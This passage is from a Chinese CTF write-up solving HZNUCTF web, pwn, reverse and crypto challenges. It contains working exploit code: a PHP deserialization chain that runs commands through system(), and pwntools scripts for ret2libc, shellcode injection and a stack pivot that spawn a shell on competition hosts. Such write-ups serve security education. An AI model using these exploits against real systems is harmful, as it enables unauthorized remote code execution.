\u0026#34;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“{{}}” 最后，如果你用了cat，就可以见到齐天大圣了 \u0026#34; template= template.replace(\u0026#34;天命\u0026#34;,\u0026#34;{{\u0026#34;).replace(\u0026#34;难违\u0026#34;,\u0026#34;}}\u0026#34;) template = template if \u0026#34;cat\u0026#34; in template: template2 = \u0026#39; 或许你这只叫天命人的猴子，真的能做到？ Image\u0026#39; try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f\u0026#34;500报错了，查询语句如下： {template}\u0026#34; return error_message, 400 @app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def hinter(): template=\u0026#34;hint： 有一个aazz路由，去那里看看吧，天命人!\u0026#34; return render_template_string(template) @app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def finder(): with open(__file__, \u0026#39;r\u0026#39;) as f: source_code = f.read() return f\u0026#34; {source_code} \u0026#34;, 200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html; charset=utf-8\u0026#39;} if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) 很难绕的 SSTI 一直在爆500错误\n什么文件上传？\r打开以为是文件上传，但是传什么文件都不行，F12看一眼，提示“机器人是什么”\n到robots协议里看一眼：\n1 2 3 4 5 6 7 8 9 User-Agent: * Disallow: /admin/ Disallow: /private/ Disallow: /baidu Disallow: /s? Disallow: /unlink Disallow: /phar Disallow: !@*($^\u0026amp;*!@^\u0026amp;!*(@$# \u0026lt;--!文件上传后缀是三个小写字母 !@#$*\u0026amp;^(!%@#$#^\u0026amp;!--\u0026gt; Disallow: /class.php 进 class.php\n发现是PHP反序列化：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 php \u0026lt;?php highlight_file(__FILE__); error_reporting(0); function best64_decode($str) { return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); } class yesterday { public $learn; public $study=\u0026#34;study\u0026#34;; public $try; public function __construct() { $this-\u0026gt;learn = \u0026#34;learn\u0026lt;br\u0026gt;\u0026#34;; } public function __destruct() { echo \u0026#34;You studied hard yesterday.\u0026lt;br\u0026gt;\u0026#34;; return $this-\u0026gt;study-\u0026gt;hard(); } } class today { public $doing; public $did; public $done; public function __construct(){ $this-\u0026gt;did = \u0026#34;What you did makes you outstanding.\u0026lt;br\u0026gt;\u0026#34;; } public function __call($arg1, $arg2) { $this-\u0026gt;done = \u0026#34;And what you\u0026#39;ve done has given you a choice.\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;done; if(md5(md5($this-\u0026gt;doing))==666){ return $this-\u0026gt;doing(); } else{ return $this-\u0026gt;doing-\u0026gt;better; } } } class tommoraw { public $good; public $bad; public $soso; public function __invoke(){ $this-\u0026gt;good=\u0026#34;You\u0026#39;ll be good tommoraw!\u0026lt;br\u0026gt;\u0026#34;; echo $this-\u0026gt;good; } public function __get($arg1){ $this-\u0026gt;bad=\u0026#34;You\u0026#39;ll be bad tommoraw!\u0026lt;br\u0026gt;\u0026#34;; } } class future{ private $impossible=\u0026#34;How can you get here?\u0026lt;br\u0026gt;\u0026#34;; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) { if ($this-\u0026gt;out-\u0026gt;useful7) { echo \u0026#34;Seven is my lucky number\u0026lt;br\u0026gt;\u0026#34;; system(\u0026#39;whoami\u0026#39;); } } public function __toString(){ echo \u0026#34;This is your future.\u0026lt;br\u0026gt;\u0026#34;; system($_POST[\u0026#34;wow\u0026#34;]); return \u0026#34;win\u0026#34;; } public function __destruct(){ $this-\u0026gt;no = \u0026#34;no\u0026#34;; return $this-\u0026gt;no; } } if (file_exists($_GET[\u0026#39;filename\u0026#39;])){ echo \u0026#34;Focus on the previous step!\u0026lt;br\u0026gt;\u0026#34;; } else{ $data=substr($_GET[\u0026#39;filename\u0026#39;],0,-4); unserialize(best64_decode($data)); } // You learn yesterday, you choose today, can you get to your future? ?\u0026gt; 要解决这道题，需要构造一个反序列化链，触发future类的__toString方法以执行任意命令。\n步骤解析\n1.触发析构函数：\n1 2 3 当yesterday对象被销毁时，其__destruct方法会调用$this-\u0026gt;study-\u0026gt;hard()。 将yesterday的study属性设为today对象，触发today的__call方法。 2.调用魔术方法：\n1 2 3 today的__call方法在调用不存在的方法（如hard）时触发。 此时会检查$this-\u0026gt;doing的两次MD5哈希是否等于666。 3.绕过条件检查：\n1 2 3 即使条件不满足，只要$this-\u0026gt;doing是future对象，在计算MD5时会将其转换为字符串，触发__toString方法。 future的__toString执行system($_POST[\u0026#39;wow\u0026#39;])，直接执行任意命令。 Payload 生成代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 php \u0026lt;?php class yesterday { public $study; } class today { public $doing; } class future {} $future = new future(); $today = new today(); $today-\u0026gt;doing = $future; $yesterday = new yesterday(); $yesterday-\u0026gt;study = $today; $payload = serialize($yesterday); for ($i = 0; $i \u0026lt; 5; $i++) { $payload = base64_encode($payload); } echo $payload . \u0026#39;.txt\u0026#39;; // 触发反序列化 ?\u0026gt; GET方式传Payload,POST方式传递命令wow=cat /flag\n得到flag\nPWN\r签到 保护只开了NX，ret2libc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 c int __fastcall main(int argc, const char **argv, const char **envp) { char v4[112]; // [rsp+0h] [rbp-70h] BYREF setbuf(stdin, 0LL); setbuf(_bss_start, 0LL); setbuf(stderr, 0LL); puts( \u0026#34;As a student who has been learning pwn for half a year\\n\u0026#34; \u0026#34;basic ROP is an essential skill that everyone should master. \\n\u0026#34; \u0026#34;Therefore, hurry up and complete the check-in. \\n\u0026#34; \u0026#34;Welcome to the Hangzhou Normal University CTF competition, please leave your name.\u0026#34;); gets(v4); return 0; } 先泄露puts地址得到基址再调用system\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 python from pwn import* #p=process(\u0026#34;./pwn\u0026#34;) p=remote(\u0026#34;node1.tgctf.woooo.tech\u0026#34;,30372) elf=ELF(\u0026#34;./pwn\u0026#34;) libc=ELF(\u0026#34;./libc.so.6\u0026#34;) puts_plt=elf.plt[\u0026#34;puts\u0026#34;] puts_got=elf.got[\u0026#34;puts\u0026#34;] pop_rdi_ret=0x401176 ret=0x40101a main=0x401178 p.recvuntil(b\u0026#34;name.\u0026#34;) pl1=b\u0026#39;a\u0026#39;*0x78+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main) #0x70 p.sendline(pl1) puts_addr=u64(p.recvuntil(b\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) print(hex(puts_addr)) #0x7fe6ca5e2e50 libcbase=puts_addr-libc.symbols[\u0026#34;puts\u0026#34;] print(hex(libcbase)) #0x7fe6ca562000 system=libcbase+libc.symbols[\u0026#34;system\u0026#34;] binsh=libcbase+next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) pl2=b\u0026#39;a\u0026#39;*0x78+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system) #pl2=b\u0026#39;a\u0026#39;*0x78+p64(pop_rdi_ret)+p64(binsh)+p64(system) p.sendline(pl2) p.interactive() shellcode pl1:\n(调用mprotect修改权限，再调用) mov dl,7 mov sil,0xff mov al,0xa syscall （调用read，将要向缓冲区读取shellcode） xor edi,edi xor edx,esi xchg rsi,rcx syscall\npl2:\nnop*0x10\nadd rsi,0x20f mov rsp,rsi\nshellcode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 python from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) p=remote(\u0026#34;node2.tgctf.woooo.tech\u0026#34;,32130) #shellcode=\u0026#34;\\x99\\x48\\xBF\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x57\\x48\\x89\\xE7\\xB0\\x3B\\x0F\\x05\u0026#34; #shellcode=\u0026#34;\\x48\\x87\\xFC\\xBF\\x73\\x68\\x00\\x00\\x57\\x54\\x5F\\xB0\\x3B\\x0F\\x05\u0026#34; pl1=\u0026#34;\\xB2\\x07\\x40\\xB6\\xFF\\xB0\\x0A\\x0F\\x05\\x31\\xFF\\x31\\xF2\\x48\\x87\\xCE\\x0F\\x05\u0026#34; p.send(pl1) pause() pl2=b\u0026#34;\\x90\u0026#34;*0x10+b\u0026#34;\\x48\\x81\\xC6\\x0F\\x02\\x00\\x00\\x48\\x89\\xF4\u0026#34;+asm(shellcraft.sh()) p.send(pl2) p.interactive() overflow 题目在ret之前通过lea esp, [ebp-8] pop ecx lea esp, [ecx-4]调整了栈帧，因此我们通过溢出将rsp控制到bss段，在bss段写入rop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 python from pwn import * context(log_level=\u0026#39;debug\u0026#39;,os=\u0026#39;linux\u0026#39;) p=process(\u0026#34;./pwn\u0026#34;) #p=remote(\u0026#34;node1.tgctf.woooo.tech\u0026#34;,31248) eax_add=0x80b470a ebx_add=0x08049022 ecx_add=0x08049802 edx_add=0x08060bd1 int80=0x08049c6a name=0x080EF320 gdb.attach(p) pause() p.recvuntil(b\u0026#34;me?\u0026#34;) p.send(b\u0026#34;/bin/sh\\x00\u0026#34;+b\u0026#39;a\u0026#39;*8+p32(ebx_add)+p32(name)+p32(ecx_add)+p32(0)+p32(edx_add)+p32(0)+p32(eax_add)+p32(0xb)+p32(int80)) p.recvuntil(\u0026#34;right?\u0026#34;) pl=b\u0026#39;a\u0026#39;*200+p32(0x080EF334) p.sendline(pl) p.interactive() Reverse\rdeepseek用得好，逆向工程难不倒（bushi）\nBase64\r题目提示是base64算法，进IDA看看伪C\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 c nt __fastcall main(int argc, const char **argv, const char **envp) { char *v3; // rbx __int64 v4; // rcx void *v5; // rbx char Destination[16]; // [rsp+20h] [rbp-28h] BYREF sub_140001020(\u0026#34;Welcome to HZNUCTF!!!\\n\u0026#34;); sub_140001020(\u0026#34;Plz input your flag:\\n\u0026#34;); v3 = (char *)malloc(\u0026#39;*\u0026#39;); sub_140001080(\u0026#34;%s\u0026#34;); v4 = -1i64; do ++v4; while ( v3[v4] ); if ( v4 == 41 ) { strncpy_s(Destination, 9ui64, v3, 8ui64); Destination[8] = 0; if ( !strcmp(Destination, \u0026#34;HZNUCTF{\u0026#34;) ) { v5 = (void *)sub_1400010E0(v3); if ( !strcmp((const char *)v5, \u0026#34;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\u0026#34;) ) { sub_140001020(\u0026#34;Congratulation!!!\u0026#34;); free(v5); exit(1); } sub_140001020(\u0026#34;wrong_wrong!!!\u0026#34;); free(v5); exit(1); } sub_140001020(\u0026#34;wrong head!!!\u0026#34;); free(v3); exit(1); } sub_140001020(\u0026#34;wrong len!!!\u0026#34;); free(v3); return 0; } 进sub_1400010E0看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 c _BYTE *__fastcall sub_1400010E0(__int64 a1) { __int64 v2; // rbx __int64 v3; // rbp int v4; // edx int v5; // edi int v6; // edx __int64 v7; // r14 size_t v8; // rcx _BYTE *v9; // r8 __int64 v10; // r9 unsigned __int64 v11; // rdx int v12; // ecx unsigned int v13; // ecx unsigned int v14; // eax int v15; // eax int v16; // eax int v17; // eax int v18; // edi __int64 v19; // rdx int v20; // eax int v21; // eax int v22; // ecx unsigned int v23; // edx int v24; // ecx int v25; // eax int v26; // ecx unsigned int v27; // ecx unsigned int v28; // eax char v30[80]; // [rsp+20h] [rbp-68h] BYREF int v31; // [rsp+90h] [rbp+8h] v2 = -1i64; strcpy(v30, \u0026#34;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\u0026#34;); do ++v2; while ( *(_BYTE *)(a1 + v2) ); v3 = 0i64; v4 = (int)v2 / 3; if ( (_DWORD)v2 == 3 * ((int)v2 / 3) ) { v5 = 0; v6 = 4 * v4; } else if ( (int)v2 % 3 == 1 ) { v5 = 1; v6 = 4 * v4 + 4; } else if ( (int)v2 % 3 == 2 ) { v5 = 2; v6 = 4 * v4 + 4; } else { v5 = v31; v6 = v31; } v7 = v6; v8 = v6 + 1i64; if ( v6 == -1i64 ) v8 = -1i64; v9 = malloc(v8); if ( (int)v2 - v5 \u0026gt; 0 ) { v10 = a1 + 2; v11 = ((int)v2 - v5 - 1i64) / 3ui64 + 1; do { v3 += 4i64; v12 = *(unsigned __int8 *)(v10 - 2) \u0026gt;\u0026gt; 2; v10 += 3i64; v13 = v12 + 24; v14 = v13 - 64; if ( v13 \u0026lt;= 0x40 ) v14 = v13; v9[v3 - 4] = v30[v14]; v15 = ((*(unsigned __int8 *)(v10 - 4) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v10 - 5) \u0026amp; 3))) - 40; if ( ((*(unsigned __int8 *)(v10 - 4) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v10 - 5) \u0026amp; 3u))) + 24 \u0026lt;= 0x40 ) v15 = ((*(unsigned __int8 *)(v10 - 4) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v10 - 5) \u0026amp; 3))) + 24; v9[v3 - 3] = v30[v15]; v16 = ((*(unsigned __int8 *)(v10 - 3) \u0026gt;\u0026gt; 6) | (4 * (*(_BYTE *)(v10 - 4) \u0026amp; 0xF))) - 40; if ( ((*(unsigned __int8 *)(v10 - 3) \u0026gt;\u0026gt; 6) | (4 * (*(_BYTE *)(v10 - 4) \u0026amp; 0xFu))) + 24 \u0026lt;= 0x40 ) v16 = ((*(unsigned __int8 *)(v10 - 3) \u0026gt;\u0026gt; 6) | (4 * (*(_BYTE *)(v10 - 4) \u0026amp; 0xF))) + 24; v9[v3 - 2] = v30[v16]; v17 = (*(_BYTE *)(v10 - 3) \u0026amp; 0x3F) - 40; if ( (*(_BYTE *)(v10 - 3) \u0026amp; 0x3Fu) + 24 \u0026lt;= 0x40 ) v17 = (*(_BYTE *)(v10 - 3) \u0026amp; 0x3F) + 24; v9[v3 - 1] = v30[v17]; --v11; } while ( v11 ); } v18 = v5 - 1; if ( !v18 ) { v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) \u0026gt;\u0026gt; 2) - 40; if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) \u0026gt;\u0026gt; 2) + 24 \u0026lt;= 0x40u ) v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) \u0026gt;\u0026gt; 2) + 24; v9[v7 - 4] = v30[v25]; v26 = *(_BYTE *)((int)v2 + a1 - 1) \u0026amp; 3; *(_WORD *)\u0026amp;v9[v7 - 2] = 15677; v27 = 16 * v26 + 24; v28 = v27 - 64; if ( v27 \u0026lt;= 0x40 ) v28 = v27; v9[v7 - 3] = v30[v28]; goto LABEL_37; } if ( v18 != 1 ) { LABEL_37: v9[v7] = 0; return v9; } v19 = a1 + (int)v2; v20 = (*(unsigned __int8 *)(v19 - 2) \u0026gt;\u0026gt; 2) - 40; if ( (*(unsigned __int8 *)(v19 - 2) \u0026gt;\u0026gt; 2) + 24 \u0026lt;= 0x40u ) v20 = (*(unsigned __int8 *)(v19 - 2) \u0026gt;\u0026gt; 2) + 24; v9[v7 - 4] = v30[v20]; v21 = ((*(unsigned __int8 *)(v19 - 1) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v19 - 2) \u0026amp; 3))) - 40; if ( ((*(unsigned __int8 *)(v19 - 1) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v19 - 2) \u0026amp; 3u))) + 24 \u0026lt;= 0x40 ) v21 = ((*(unsigned __int8 *)(v19 - 1) \u0026gt;\u0026gt; 4) | (16 * (*(_BYTE *)(v19 - 2) \u0026amp; 3))) + 24; v9[v7 - 3] = v30[v21]; v22 = *(_BYTE *)(v19 - 1) \u0026amp; 0xF; *(_WORD *)\u0026amp;v9[v7 - 1] = 61; v23 = 4 * v22 + 24; v24 = 4 * v22 - 40; if ( v23 \u0026lt;= 0x40 ) v24 = v23; v9[v7 - 2] = v30[v24]; return v9; } 我们看到魔改的base64编码表 GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\n通过读源码我们得知，程序将输入的flag使用自定义的base64编码表进行加密，得到字符串 AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\n我们逆向逻辑编写脚本得到flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 python import base64 def custom_b64decode(encoded_str): # 自定义编码表 table = \u0026#34;GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\u0026#34; # 创建解码字典：字符 -\u0026gt; (原始值 -24) mod 64 decode_table = {c: (i - 24) % 64 for i, c in enumerate(table)} # 处理填充并分割成4字符一组 pad = 0 if encoded_str.endswith(\u0026#39;==\u0026#39;): pad = 2 encoded_str = encoded_str[:-2] + \u0026#39;AA\u0026#39; # 替换填充为可处理的字符 elif encoded_str.endswith(\u0026#39;=\u0026#39;): pad = 1 encoded_str = encoded_str[:-1] + \u0026#39;A\u0026#39; # 替换填充 # 转换为二进制值列表 decoded_values = [] for c in encoded_str: decoded_values.append(decode_table.get(c, 0)) # 未知字符视为0 # 将4个6位值转换为3个字节 result = bytearray() for i in range(0, len(decoded_values), 4): chunk = decoded_values[i:i + 4] if len(chunk) \u0026lt; 4: chunk += [0] * (4 - len(chunk)) # 合并成24位整数 val = (chunk[0] \u0026lt;\u0026lt; 18) | (chunk[1] \u0026lt;\u0026lt; 12) | (chunk[2] \u0026lt;\u0026lt; 6) | chunk[3] # 拆分为3字节 bytes_group = [ (val \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (val \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, val \u0026amp; 0xFF ] # 处理填充截断 if i == len(decoded_values) - 4: if pad == 1: bytes_group = bytes_group[:2] elif pad == 2: bytes_group = bytes_group[:1] result.extend(bytes_group) return bytes(result) # 目标加密后的Base64字符串 encoded = \u0026#34;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\u0026#34; flag = custom_b64decode(encoded) print(flag) 得到flag\n水果忍者\r很熟悉的水果忍者小游戏，许多年之后，面对Unity逆向坐牢，我将会回想起，我在卧室偷偷用家长手机玩游戏的那个遥远的晚上（bushi）。\n用 dnSpy打开，定位到 Assembly_CSharp -\u0026gt; GameManager\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 c# using System; using System.Collections; using System.IO; using System.Security.Cryptography; using System.Text; using UnityEngine; using UnityEngine.UI; // Token: 0x02000005 RID: 5 [DefaultExecutionOrder(-1)] public class GameManager : MonoBehaviour { // Token: 0x17000003 RID: 3 // (get) Token: 0x06000013 RID: 19 RVA: 0x00002351 File Offset: 0x00000551 // (set) Token: 0x06000014 RID: 20 RVA: 0x00002358 File Offset: 0x00000558 public static GameManager Instance { get; private set; } // Token: 0x17000004 RID: 4 // (get) Token: 0x06000015 RID: 21 RVA: 0x00002360 File Offset: 0x00000560 // (set) Token: 0x06000016 RID: 22 RVA: 0x00002368 File Offset: 0x00000568 public int score { get; private set; } // Token: 0x06000017 RID: 23 RVA: 0x00002371 File Offset: 0x00000571 private void Awake() { if (GameManager.Instance != null) { Object.DestroyImmediate(base.gameObject); return; } GameManager.Instance = this; } // Token: 0x06000018 RID: 24 RVA: 0x00002392 File Offset: 0x00000592 private void OnDestroy() { if (GameManager.Instance == this) { GameManager.Instance = null; } } // Token: 0x06000019 RID: 25 RVA: 0x000023A7 File Offset: 0x000005A7 private void Start() { this.NewGame(); } // Token: 0x0600001A RID: 26 RVA: 0x000023B0 File Offset: 0x000005B0 private void NewGame() { Time.timeScale = 1f; this.ClearScene(); this.blade.enabled = true; this.spawner.enabled = true; this.score = 0; this.scoreText.text = this.score.ToString(); if (this.decryptedTextDisplay != null) { this.decryptedTextDisplay.text = \u0026#34;\u0026#34;; } } // Token: 0x0600001B RID: 27 RVA: 0x00002424 File Offset: 0x00000624 private void ClearScene() { Fruit[] array = Object.FindObjectsOfType\u0026lt;Fruit\u0026gt;(); for (int i = 0; i \u0026lt; array.Length; i++) { Object.Destroy(array[i].gameObject); } Bomb[] array2 = Object.FindObjectsOfType\u0026lt;Bomb\u0026gt;(); for (int i = 0; i \u0026lt; array2.Length; i++) { Object.Destroy(array2[i].gameObject); } } // Token: 0x0600001C RID: 28 RVA: 0x00002474 File Offset: 0x00000674 public void IncreaseScore(int points) { this.score += points; this.scoreText.text = this.score.ToString(); if (this.score \u0026gt;= 999999999) { byte[] cipherText = this.ConvertHexStringToByteArray(GameManager.encryptedHexData); string text = this.Decrypt(cipherText, GameManager.encryptionKey, GameManager.iv); if (this.decryptedTextDisplay != null) { this.decryptedTextDisplay.text = text; } } else if (this.decryptedTextDisplay != null) { this.decryptedTextDisplay.text = \u0026#34;\u0026#34;; } float num = PlayerPrefs.GetFloat(\u0026#34;hiscore\u0026#34;, 0f); if ((float)this.score \u0026gt; num) { num = (float)this.score; PlayerPrefs.SetFloat(\u0026#34;hiscore\u0026#34;, num); } } // Token: 0x0600001D RID: 29 RVA: 0x0000253C File Offset: 0x0000073C private byte[] ConvertHexStringToByteArray(string hex) { int length = hex.Length; byte[] array = new byte[length / 2]; for (int i = 0; i \u0026lt; length; i += 2) { array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16); } return array; } // Token: 0x0600001E RID: 30 RVA: 0x0000257C File Offset: 0x0000077C private string Decrypt(byte[] cipherText, string key, string iv) { string result; using (Aes aes = Aes.Create()) { aes.Key = Encoding.UTF8.GetBytes(key); aes.IV = Encoding.UTF8.GetBytes(iv); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV); using (MemoryStream memoryStream = new MemoryStream(cipherText)) { using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read)) { using (StreamReader streamReader = new StreamReader(cryptoStream)) { result = streamReader.ReadToEnd(); } } } } return result; } // Token: 0x0600001F RID: 31 RVA: 0x00002658 File Offset: 0x00000858 public void Explode() { this.blade.enabled = false; this.spawner.enabled = false; base.StartCoroutine(this.ExplodeSequence()); } // Token: 0x06000020 RID: 32 RVA: 0x0000267F File Offset: 0x0000087F private IEnumerator ExplodeSequence() { float elapsed = 0f; float duration = 0.5f; while (elapsed \u0026lt; duration) { float num = Mathf.Clamp01(elapsed / duration); this.fadeImage.color = Color.Lerp(Color.clear, Color.white, num); Time.timeScale = 1f - num; elapsed += Time.unscaledDeltaTime; yield return null; } yield return new WaitForSecondsRealtime(1f); this.NewGame(); elapsed = 0f; while (elapsed \u0026lt; duration) { float t = Mathf.Clamp01(elapsed / duration); this.fadeImage.color = Color.Lerp(Color.white, Color.clear, t); elapsed += Time.unscaledDeltaTime; yield return null; } yield break; } // Token: 0x0400000F RID: 15 [SerializeField] private Blade blade; // Token: 0x04000010 RID: 16 [SerializeField] private Spawner spawner; // Token: 0x04000011 RID: 17 [SerializeField] private Text scoreText; // Token: 0x04000012 RID: 18 [SerializeField] private Image fadeImage; // Token: 0x04000013 RID: 19 [Header(\u0026#34;Decrypted Text Display\u0026#34;)] [SerializeField] private Text decryptedTextDisplay; // Token: 0x04000015 RID: 21 private static readonly string encryptionKey = \u0026#34;HZNUHZNUHZNUHZNU\u0026#34;; // Token: 0x04000016 RID: 22 private static readonly string iv = \u0026#34;0202005503081501\u0026#34;; // Token: 0x04000017 RID: 23 private static readonly string encryptedHexData = \u0026#34;cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf\u0026#34;; } 看到是AES算法\nencryptedHexData是硬编码的十六进制字符串，加密密钥和IV分别是”HZNUHZNUHZNUHZNU”和”0202005503081501”。\nDecrypt方法使用了AES的CBC模式，填充方式是PKCS7。因此，解密时需要正确的密钥和IV，并且密文是经过十六进制编码的，需要先转换回字节数组。\n加密数据：十六进制字符串cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf。\n编写脚本，使用密钥和IV对加密数据进行AES-CBC解密，并处理PKCS7填充。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 python from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # 加密数据（十六进制字符串） encrypted_hex = \u0026#34;cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf\u0026#34; ciphertext = bytes.fromhex(encrypted_hex) # 密钥和IV（UTF-8编码） key = b\u0026#39;HZNUHZNUHZNUHZNU\u0026#39; # 16字节 iv = b\u0026#39;0202005503081501\u0026#39; # 16字节 # 创建AES解密器 cipher = AES.new(key, AES.MODE_CBC, iv=iv) # 解密并去除填充 plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size) # 输出解密结果 print(\u0026#34;解密后的明文:\u0026#34;, plaintext.decode(\u0026#39;utf-8\u0026#39;)) Crypto\rAAAAAAAA·真·签到\r题目：\n1 2 3 4 5 6 7 8 9 10 11 给你flag签个到好了 UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB} 诶，我的flag怎么了？？？？ 好像字母对不上了 我的签到怎么办呀，急急急 听说福来阁好像是TGCTF开头的喔 比较错误前缀UGBRC与正确前缀TGCTF，发现每个字母的移位量依次为-1, 0, +1, +2, +3，即第i个字符（从0开始）移位量为i-1。\n原字符串：\n1 0:U,1:G,2:B,3:R,4:C,5:{,6:R,7:I,8:0,9:G,10:!,11:O,12:0,13:4,14:_,15:5,16:C,17:3,18:_,19:O,20:V,21:U,22:I,23:_,24:D,25:V,26:_,27:M,28:N,29:T,30:B,31:} 对于每个字母字符，移位量是其位置i减1。例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 i=0:U →移位-1 →T i=1:G →0 →G i=2:B →+1 →C i=3:R →+2 →T i=4:C →+3 →F i=6:R →i=6 →移位5 →R+5=W i=7:I →移位6 →I+6=O i=9:G →i=9 →移位8 →G+8=O i=11:O →i=11 →移位10 →O+10=Y i=16:C →i=16 →移位15 →C+15=R i=19:O →i=19 →移位18 →O+18= (O是第14个字母，A=0的话，14+18=32 →32 mod26=6 →G) i=20:V →i=20 →移位19 →V+19= (V是21 →21+19=40 →40 mod26=14 →O) i=21:U →i=21 →移位20 →U+20= (20+20=40 mod26=14 →O) i=22:I →i=22 →移位21 →I+21= (8+21=29 mod26=3 →D) i=24:D →i=24 →移位23 →D+23= (3+23=26 mod26=0 →A) i=25:V →i=25 →移位24 →V+24= (21+24=45 mod26=19 →T) i=27:M →i=27 →移位26 →M+26= (12+26=38 mod26=12 →M) i=28:N →i=28 →移位27 →N+27= (13+27=40 mod26=14 →O) i=29:T →i=29 →移位28 →T+28= (19+28=47 mod26=21 →V) i=30:B →i=30 →移位29 →B+29= (1+29=30 mod26=4 →E) 将这些转换后的字母代入原字符串，保持非字母字符不变：\nTGCTF{ W O 0 O ! Y 0 4 _ 5 R 3 _ G O O D _ A T _ M O V E 